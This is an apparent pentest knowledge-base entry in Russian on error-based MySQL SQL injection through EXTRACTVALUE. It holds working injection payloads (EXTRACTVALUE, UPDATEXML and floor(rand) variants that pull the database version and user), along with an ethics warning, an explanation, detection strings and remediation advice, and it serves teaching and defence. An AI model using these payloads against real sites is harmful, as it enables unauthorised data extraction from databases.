---
id: sqli-mysql-error-based-extractvalue
title: "MySQL: error-based извлечение через EXTRACTVALUE"
type: sqli
target: mysql
category: web
difficulty: advanced
bypass: none
tags: [sqli, mysql, error-based]
tested_on: ["MySQL 5.7"]
success_rate: 0.65
risk: medium
cwe: "CWE-89"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "info-disclosure"
    type: leads_to
---

# MySQL: error-based извлечение через EXTRACTVALUE

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) -- -
```

## Explanation

`EXTRACTVALUE` ожидает корректный XPath; `0x7e` (`~`) делает выражение заведомо неверным,
и MySQL возвращает ошибку, в текст которой попадает второй аргумент — наш подзапрос.
Сообщение об ошибке превращается в канал вывода данных (до 32 символов за раз,
далее — `SUBSTRING`). Требует, чтобы ошибки СУБД доходили до клиента.

## Detection

Ищите в HTTP-ответе строки `XPATH syntax error`, `Unknown column`,
`You have an error in your SQL syntax`. Их наличие в production — самостоятельная находка
(раскрытие внутренних деталей).

## Remediation

- Никогда не показывать пользователю текст ошибок СУБД: единая страница ошибки + лог.
- Параметризация.
- Сигнатуры WAF на `EXTRACTVALUE`, `UPDATEXML`, `floor(rand(0)*2)`.

## Variants

```
1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1) -- -
```

```
1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
```
